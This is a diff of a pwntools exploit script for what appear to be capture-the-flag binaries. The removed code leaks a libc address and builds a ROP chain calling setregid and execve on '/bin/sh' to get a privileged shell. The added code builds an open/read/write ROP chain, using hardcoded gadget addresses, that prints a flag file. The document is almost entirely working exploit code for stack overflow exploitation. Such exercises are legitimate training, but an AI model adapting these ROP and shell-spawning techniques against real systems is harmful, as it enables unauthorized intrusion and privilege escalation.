@@ -1,13 +1,12 @@
 from pwn import *
 import os
 
-DEBUG = False 
-file = "./rop-4-64"
+DEBUG = False
+file = "./rop-2-64"
 env = {"PATH":"$PATH:."}
 
 elf = ELF(file)
-libc = elf.libc
-max_len = 0x136
+max_len = 136
 
 # launch the main process (still boilerplate)
 if DEBUG:
@@ -15,6 +14,7 @@ if DEBUG:
     context.terminal = ['tmux', 'splitw', '-h']
     io = gdb.debug(file, env=env, gdbscript='''
 b *input_func
+b *0x00000000004006bb
 continue
 ''')
 
@@ -25,50 +25,47 @@ else:
 # END SETUP BOILERPLATE
 # BEGIN CHALLENGE-SPECIFIC CODE
 
-got_read = p64(?)
-puts = p64(elf.symbols["puts"])
-input_func = p64(elf.symbols["input_func"])
+os.symlink("./flag", "./main")
+
+write = p64(elf.symbols["write"])
+read = p64(elf.symbols["read"])
+opn = p64(elf.symbols["open"])
+main = p64(0x4003a7)
+writeable = p64(0x601000 + 0x500)
+
+pop_rdi = p64(0x0000000000400743)
+pop_rsi_2 = p64(0x0000000000400741)
+pop_rdx = p64(0x0000000000400668)
 
 payload = flat (
     b"A" * max_len,
-    puts,
-    input_func,
-    got_read
+    pop_rdi,
+    main,
+    pop_rsi_2,
+    p64(0),
+    b"A" * 8,
+    pop_rdx,
+    p64(0),
+    opn,
+    pop_rdi,
+    p64(0x3),
+    pop_rsi_2,
+    writeable,
+    b"A" * 8,
+    pop_rdx,
+    p64(100),
+    read,
+    pop_rdi,
+    p64(0x1),
+    pop_rsi_2,
+    writeable,
+    b"A" * 8,
+    pop_rdx,
+    p64(100),
+    write,
 )
 
-io.sendline(payload)
-io.recvuntil(b'\n!\n')
-
-
-libc_read = u64(io.recvline()[0:4])
-libc_address = libc_read - libc.symbols["read"]
-
-libc.address = libc_address
-
-print("libc_address", libc.address)
-
-setregid = libc.symbols["setregid"]
-print("setregid", hex(setregid))
-
-execve = libc.symbols["execve"]
-pop2 = p64(0x0804873a)
-binsh = next(libc.search(b'/bin/sh'))
-print(hex(binsh))
-
-payload = flat (
-    b"A" * max_len,
-    setregid,
-    pop2,
-    p64(50006),
-    p64(50006),
-    execve,
-    b"A" * 4,
-    binsh,
-    p64(0),
-    p64(0),
-)
-io.sendline(payload)
-
+io.send(payload)
 io.interactive()
 
 # END CHALLENGE-SPECIFIC CODE
@@ -78,3 +75,4 @@ io.interactive()
 # io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
 # flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
 # print(flag)
+os.unlink("./main")
